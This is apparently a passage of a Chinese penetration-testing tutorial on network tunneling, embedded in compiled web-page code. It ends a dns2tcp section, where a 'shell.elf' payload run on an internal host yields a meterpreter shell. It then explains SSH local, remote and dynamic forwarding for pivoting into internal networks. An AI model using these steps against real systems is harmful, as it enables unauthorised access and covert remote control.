</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在内网的主机(这里选择另一台虚拟机192.168.13.100)运行shell.elf</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>chmod 777 shell.elf 
./shell.elf 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>成功得到上线meterpreter shell：</p><figure><img src="`+W+`" alt="dns2tcp6" tabindex="0" loading="lazy"><figcaption>dns2tcp6</figcaption></figure><h2 id="_3-ssh隧道" tabindex="-1"><a class="header-anchor" href="#_3-ssh隧道" aria-hidden="true">#</a> 3. SSH隧道</h2><p><strong>本地转发：</strong></p><p>用法1：本地端口映射到远程。HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>HostB$ ssh -CNfg -L PortB:HostC:PortC user@HostC
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。</p><p>用法2：本地端口通过跳板映射到其他机器。HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC上，在 HostA 上运行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>HostA$ ssh -CNfg -L PortA:HostC:PortC  user@HostB
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这时访问 HostA:PortA 相当于访问 HostC:PortC。</p><p>两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。</p><p>**远程转发：**让远端启动端口，把远端端口数据转发到本地。</p><p>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>HostA$ ssh -CNfg -R HostC:PortC:HostB:PortB  user@HostC
#HostA的ssh服务端监听7777, 将收到的tcp数据包通过连接到HostB的ssh隧道，转发到HostC:PortC，效果是访问HostA本地的7777就相当于访问HostC:PortC
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GatewayPorts yes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>相当于-L参数区别：比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC是外网跳板机，HostC不能访问 HostA，但是 HostA 可以访问 HostC。那么通过在内网 HostA 上运行 <code>ssh -R</code> 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。</p><p>同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是内网 HostA 把自己可以访问的端口暴露给了外网 HostC。</p><p>**动态转发：**socks代理</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1
# ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址，也就是只要知道一个内网主机的密码，就可以用它上面的ssh服务转发流量了。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>构建ssh隧道的常用参数:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-C 压缩传输，提高传输速度
-f 后台执行数据传输
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发，即SOCKS代理
-p 指定ssh连接端口
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_4-tcp-over-http" tabindex="-1"><a class="header-anchor" href="#_4-tcp-over-http" aria-hidden="true">#</a> 4. TCP over HTTP</h2><h3 id="_4-1-abptts" tabindex="-1"><a class="header-anchor" href="#_4-1-abptts" aria-hidden="true">#</a> 4.1 ABPTTS</h3>`,193);function X(Q,U){const i=n("ExternalLinkIcon");return t(),l("div",null,[J,e("blockquote",null,[e("p",null,[e("a",Y,[r("Thorsten Alteholz / ptunnel · GitLab (debian.org)"),d(i)])])]),F])}const Z=a(j,[["render",X],["__file","Tunnel.html.vue"]]);export{Z as default};
